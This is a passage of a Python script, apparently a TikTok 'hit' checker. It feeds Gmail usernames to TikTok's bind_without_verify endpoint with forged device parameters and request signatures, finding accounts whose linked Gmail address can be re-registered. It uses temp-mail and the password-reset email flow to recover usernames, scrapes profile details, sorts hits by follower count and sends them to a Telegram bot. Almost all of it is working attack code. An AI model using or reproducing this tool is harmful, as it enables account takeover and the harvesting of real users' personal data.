		url = f"https://{host}/passport/email/send_code/"
		params.update({"not_login_ticket":passport_ticket,"email":name_xor})
		m = SignerPy.sign(params=params, cookie=cookies)
		headers = {
		    'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_GB; SM-G998B; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
		    'Accept-Encoding': "gzip",
		    'x-ss-stub': m['x-ss-stub'],
		    'x-ss-req-ticket': m['x-ss-req-ticket'],
		    'x-ladon': m['x-ladon'],
		    'x-khronos': m['x-khronos'],
		    'x-argus': m['x-argus'],
		    'x-gorgon': m['x-gorgon'],
		}
		proxies = {"http": f"http://{proxy}","https": f"http://{proxy}"}		
		response = s.post(url, headers=headers, params=params, cookies=cookies,proxies=proxies)		
		time.sleep(5)		
		cookies = {
		    '_ga': 'GA1.1.504663773.1754435486',
		    '__gads': 'ID=0cfb694765742032:T=1754435487:RT=1754435487:S=ALNI_MbIZNqLgouoeIxOQ2-N-0-cjxxS1A',
		    '__gpi': 'UID=00001120bc366066:T=1754435487:RT=1754435487:S=ALNI_MaWgWYrKEmStGHPiLiBa1zlQOicuA',
		    '__eoi': 'ID=22d520639150e74a:T=1754435487:RT=1754435487:S=AA-AfjZKI_lD2VnwMipZE8ienmGW',
		    'FCNEC': '%5B%5B%22AKsRol8AtTXetHU2kYbWNbhPJd-c3l8flgQb4i54HStVK8CCEYhbcA3kEFqWYrBZaXKWuO9YYJN53FddyHbDf05q1qY12AeNafjxm2SPp7mhXZaop_3YiUwuo_WHJkehVcl5z4VyD7GHJ_D8nI2DfTX5RfrQWIHNMA%3D%3D%22%5D%5D',
		    '_ga_3DVKZSPS3D': 'GS2.1.s1754435486$o1$g0$t1754435503$j43$l0$h0',
		}
		
		headers = {
		    'accept': '*/*',
		    'accept-language': 'en,ar;q=0.9,en-US;q=0.8',
		    'application-name': 'web',
		    'application-version': '4.0.0',
		    'content-type': 'application/json',
		    'origin': 'https://temp-mail.io',
		    'priority': 'u=1, i',
		    'referer': 'https://temp-mail.io/',
		    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Windows"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
		    'x-cors-header': 'iaWg3pchvFx48fY',
		    
		}
		
		response = requests.get(
		    'https://api.internal.temp-mail.io/api/v3/email/{}/messages'.format(name),
		    cookies=cookies,
		    headers=headers,
		)
		try:
		    part = response.text.split('This email was generated for')[1].split("'")[0]
		    username = part.split()[0]
		    username = username.split('@')[0]
		    username = username.split('\\n')[0]
		    username = username[:-1] * (username[-1:] == ".") or username
		    return username
		except:
		    pass
	@staticmethod
	def get_level(id):
		url = "https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?request_from=profile_card_v2&request_from_scene=1&target_uid="+str(id)+"&iid="+str(random.randint(1, 10**19))+"&device_id="+str(random.randint(1, 10**19))+"&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid="+str(binascii.hexlify(os.urandom(8)).decode())+"&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"+"&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1)+"&cdid="+str(uuid.uuid4())+"&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"	
		headers = {'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"}
		headers.update(Encryption.sign(url.split('?')[1], '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233))
		response = requests.get(url, headers=headers)	
		try:
			return re.search(r'"default_pattern":"(.*?)"', response.text).group(1).split('المستوى رقم ')[1]
		except Exception as e:
			return 'h'
	@staticmethod
	def info(email):
		username = SAN.email_2_user(email=email)
		if username == 'h':
			return '','',''
		for _ in range(2):
			try:
				headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }
				url = f"https://www.tiktok.com/@{username}"
				response = requests.get(url, headers=headers,timeout=10).text
				data = response.split('''"userInfo":{"user":{''')[1].split('''</sc''')[0]
				id = data.split('"id":"')[1].split('"')[0]	
				nickname = data.split('"nickname":"')[1].split('"')[0]
				following = data.split('"followingCount":')[1].split(',')[0]
				followers = data.split('"followerCount":')[1].split(',')[0]
				likes = data.split('"heart":')[1].split(',')[0]
				id =  data.split('"followerCount":')[1].split(',')[0]
				language =  data.split('"language":')[1].split(',')[0]
				vid =  data.split('"vid":')[1].split(',')[0]
				priv =  data.split('"priv":')[1].split(',')[0]
				ff = f'''
𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:9
❄️𝗜𝗻𝗳𝗼 : معلومات صح
❄️𝗨𝘀𝗲𝗿𝗡𝗮𝗺𝗲 : {username}
❄️𝗘𝗺𝗮𝗶𝗹 : {email}
❄️𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers}
❄️𝗡𝗮𝗺𝗲 : {nickname}
❄️𝗟𝗶𝗸𝗲𝘀 : {likes}
❄️𝗟𝗲𝘃𝗲𝗹 : {HSON.get_level(id)}
❄️𝗜𝗗 : {id}
❄️𝗩𝗶𝗱𝗲𝗼𝘀 : {vid}
❄️𝗣𝗿𝗶𝘃𝗮𝘁𝗲 : {priv}
❄️𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 : {language}
❄️𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗲 : @oo22bb
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:9
'''
				return ff,username,followers
			except:
				continue
		ff = f'''
𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧		
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:9		
❄username : {username}
❄ email : {email}
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:9'''       
		return ff,username,None
					
class tiktok:
    def __init__(self):            
        self.hit = 0
        self.ok = 0
        self.bad1 = 0
        self.bad2 = 0
        banner()
        self.token = input(f'	{a3}Enter {a4}Token : '+RED)
        self.id = input(f'	{a3}Enter {a4}ID : '+RE)
        self.session = requests.Session()
        self.secret = secrets.token_hex(16)
        self.telegram = 'https://api.telegram.org/bot'
        
        self.followers_ranges = [0,0, 0, 0]
        self.print_lock = threading.Lock()  
    def print_stats(self):
        with self.print_lock:            
            stats = f"""
	{a3}Hits : {W}{self.hit}
	
	{a5}Ealse : {W}{self.bad1} 
	
	{YELLOW}Bad Gm : {W}{self.ok} 
	
	{RE}False : {W}{self.bad2}
"""
            sys.stdout.write('\033[H\033[J')
            sys.stdout.write(stats + '\n')
            sys.stdout.flush() 
    def send_tele(self, email):
        info, user, followers = SAN.info(email)
        if user:
            followers = int(followers)
            with self.print_lock:
	                self.hit += 1
	                try:
	                    folder = "Hits"
	                    os.makedirs(folder, exist_ok=True)
	                    if 0 <= followers <= 999:
	                    	self.followers_ranges[0] += 1
	                    	filename = f"{folder}/0-999.txt"
	                    elif 1000 <= followers <= 9999:
	                        self.followers_ranges[1] += 1
	                        filename = f"{folder}/1k-9999.txt"
	                    elif 10000 <= followers <= 99999:
	                        self.followers_ranges[2] += 1
	                        filename = f"{folder}/10k-100k.txt"
	                    elif followers >= 100000:
	                        self.followers_ranges[3] += 1
	                        filename = f"{folder}/100k+.txt"
	                    else:
	                        filename = None
	                    if filename:
	                        with open(filename, 'a', encoding='utf-8') as f:
	                            f.write(info + '\n')
	                except Exception as e:
	                    pass
            self.print_stats()
            requests.get(f'{self.telegram}{self.token}/sendMessage?chat_id={self.id}&text={info}')                                  
    def file(self):
            try:
                iii=input(f'{a3}	Enter Your File To Be Checked : ')
                with open(iii, 'r',encoding='utf-8') as f:
                    username = set(line.strip() for line in f if line.strip())
                with ThreadPoolExecutor(max_workers=SPEED) as executor:
                    executor.map(self.check_tiktok, username)
            except FileNotFoundError:
                print("السته غير موجوده")
                
    def check_tiktok(self, user):
            try:
                email = user+'@gmail.com'
                cookies = {"passport_csrf_token": self.secret,"passport_csrf_token_default": self.secret,"sessionid":nameee}
                self.session.cookies.update(cookies)
                params = {'_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",    'cdid': str(uuid.uuid4()),'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),    'iid': str(random.randint(1, 10**19)),    'device_id': str(random.randint(1, 10**19)),    'openudid': str(binascii.hexlify(os.urandom(8)).decode())}
                _rticket = params["_rticket"]
                device_id = params["device_id"]
                iid = params["iid"]
                cdid = params["cdid"]
                openudid = params["openudid"]
                _rticket = params["_rticket"]
                ts = params["ts"]
                params={'_rticket':_rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','fixed_mix_mode':'1','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','mix_mode':'1','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','region':'IQ','request_tag_from':'h5','resolution':'720%2A1280','rrb':'%7B%7D','scene':'4','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163105','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
                user_agent = (f"com.zhiliaoapp.musically/{random.randint(2000000000, 3000000000)} (Linux; U; Android {random.randint(10, 15)}; {random.choice(['ar_AE', 'en_US', 'fr_FR', 'es_ES'])}; {random.choice(['phone', 'tablet', 'tv'])}; Build/UP1A.{random.randint(200000000, 300000000)}; Cronet/{random.randint(10000000, 20000000)} {random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}; QuicVersion:{random.randint(10000000, 20000000)} {random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02})")
                m=Encryption.sign(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
                headers = {
                'User-Agent': user_agent,
                'x-tt-passport-csrf-token': self.secret,
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                'x-argus': m["x-argus"],
                'x-gorgon': m["x-gorgon"],
                'x-khronos': m["x-khronos"],
                'x-ladon': m["x-ladon"]}
                try:
                    url="https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&"
                    res = requests.post(url, params=params, headers=headers, data={"email":email}, cookies=cookies).text
#                    print(res)
                    if 'Email is linked to another account. Unlink or try another email.' in res:
                        with self.print_lock:
                            self.ok += 1
                        self.print_stats()
                        self.check_gmail(email)
                    else:
                        with self.print_lock: 
                            self.bad1 += 1
                        self.print_stats()		      
                except Exception as e:
                    print(e)
            except Exception as e:
                    print(e)    
    def check_gmail(self, emailll):
            email = emailll.split('@')[0]
            check = PKK.Gmail.CheckGmail(email)
            if check == {'Programmer': 'Ibn_Suleiman', 'Check': 'Good'}:
                print(emailll)
                self.send_tele(emailll)
            else:
                with self.print_lock: 
                    self.bad2 += 1
                self.print_stats()
if __name__ == "__main__":
    tiktok().file()
